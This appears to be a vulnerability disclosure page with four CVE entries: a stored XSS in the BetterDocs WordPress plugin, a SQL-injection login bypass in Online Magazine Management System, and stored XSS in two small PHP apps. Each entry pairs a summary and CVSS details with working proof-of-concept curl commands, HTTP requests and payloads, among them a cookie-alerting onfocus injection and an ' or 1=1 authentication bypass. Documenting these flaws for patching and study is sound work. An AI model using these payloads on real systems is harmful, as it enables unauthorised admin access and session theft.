BetterDocs ≤ 4.5.3

CVE-2026-12157 6.4 Medium 2026-06-18
  • WordPress plugin
  • Stored XSS
  • Wordfence

Summary

The BetterDocs WordPress plugin (≤ 4.5.3) is vulnerable to authenticated stored cross-site scripting. A low-privileged user (Contributor and above) can inject JavaScript through the blockId attribute of a BetterDocs block, which is echoed into page markup without sufficient output escaping. The script then runs in the browser of anyone who views the affected content.

Technical breakdown

  • TypeStored XSS (authenticated)
  • ComponentblockId block attribute
  • Version≤ 4.5.3
  • PrivilegeContributor and above
  • CVSS 3.1CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N

Proof of concept

The blockId attribute of a BetterDocs block is written into the rendered markup without escaping. A crafted value breaks out of the attribute and adds onfocus + autofocus, so the payload fires the moment the element is focused — for example when an Administrator previews the pending post. Tested on BetterDocs 4.3.12 (affected ≤ 4.5.3) with a Contributor account.

  1. Log in as a Contributor, then fetch a REST nonce and submit the payload via the REST API (commands below).
  2. As an Administrator, go to Posts → All Posts.
  3. Hover the pending “Documentation Overview” post and click Preview.
  4. autofocus focuses the injected element and onfocus fires, popping an alert with the session cookie.
# authenticate as the Contributor curl -s -c cookies.txt -X POST http://TARGET/wp-login.php \ -d "log=CONTRIBUTOR_USER&pwd=CONTRIBUTOR_PASS&wp-submit=Log+In" # grab a REST API nonce NONCE=$(curl -s -b cookies.txt http://TARGET/wp-admin/post-new.php \ | grep -oP '"nonce":"([a-f0-9]+)"' | grep -oP '[a-f0-9]{10}') # submit the post with the crafted blockId attribute curl -s -b cookies.txt -H "X-WP-Nonce: $NONCE" -H "Content-Type: application/json" \ -X POST "http://TARGET/index.php?rest_route=/wp/v2/posts" \ -d '{"title":"Documentation Overview","status":"pending","content": "<!-- wp:betterdocs/category-slate-layout {\"blockId\":\"x\\\" onfocus=\\\"alert(document.cookie)\\\" autofocus=\\\"true\\\" tabindex=\\\"1\"} /-->"}'

Full disclosure details are on the Wordfence advisory.

Online Magazine Management System 1.0

CVE-2021-44653 9.8 Critical EDB-50561 2021-12-03
  • PHP
  • SQLi
  • Auth bypass
  • Exploit-DB

Summary

Online Magazine Management System 1.0 builds the admin login SQL query from the submitted credentials without sanitisation. A crafted username injects into the query and bypasses authentication, granting admin access with no valid password — an unauthenticated, network-reachable compromise of the application.

Technical breakdown

  • TypeSQL injection → authentication bypass
  • ComponentAdmin panel login
  • Version1.0
  • PrivilegeUnauthenticated
  • CVSS 3.1CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

Proof of concept

The login handler at /magazines/classes/Login.php?f=login concatenates the username field into the authentication query without sanitisation. The payload below makes the WHERE clause always true and logs in as the first (admin) account, no valid password required.

POST /magazines/classes/Login.php?f=login HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest username='+or+1%3D1+limit+1+--+-%2B&password=aaaa

URL-decoded, the username field is ' or 1=1 limit 1 -- -+. Published as EDB-50561 on Exploit-DB.

Online Doctor Appointment System 1.0

CVE-2021-25791 5.4 Medium EDB-49396 2021-01-08
  • PHP
  • Stored XSS
  • Exploit-DB

Summary

Online Doctor Appointment System 1.0 contains multiple stored cross-site scripting vulnerabilities in the “Update Profile” module. Profile fields are stored and later rendered without output encoding, so an authenticated user can persist JavaScript that executes in the browser of anyone who views the profile.

Technical breakdown

  • TypeStored XSS (authenticated)
  • ComponentUpdate Profile module
  • Version1.0
  • PrivilegeAuthenticated user
  • CVSS 3.1CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N

Proof of concept

The First Name, Last Name and Address fields in the Update Profile form are stored verbatim and rendered without output encoding, so an injected script runs on every page that displays them.

  1. Log in to a doctor account at /doctorappointmentsystem/adminlogin.php.
  2. Open the username menu, go to Profile, then Update profile.
  3. Enter the payload below in the First Name, Last Name and Address fields, then save.
<script>alert("craniums")</script>

The stored script then fires each time the profile is updated or viewed. Published as EDB-49396 (CVE-2021-25791) on Exploit-DB.

House Rental and Property Listing 1.0

CVE-2021-25790 5.4 Medium EDB-49352 2021-01-05
  • PHP
  • Stored XSS
  • Exploit-DB

Summary

House Rental and Property Listing 1.0 contains multiple stored cross-site scripting vulnerabilities in the “Register” module. Registration fields are stored without sanitisation and later rendered without encoding, so an attacker can persist JavaScript that runs when the data is displayed — for example in an admin panel.

Technical breakdown

  • TypeStored XSS
  • ComponentRegister module
  • Version1.0
  • PrivilegeRegistering user
  • CVSS 3.1CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N

Proof of concept

The Full Name field on the registration form is stored verbatim and rendered without output encoding, so an injected script runs once the account is logged in and its name is displayed.

  1. Sign up for the application.
  2. Enter the payload below in the Full Name field, then click Submit.
  3. Log in — the stored script fires on any page that displays the name.
<script>alert("craniums")</script>

Published as EDB-49352 (CVE-2021-25790) on Exploit-DB.
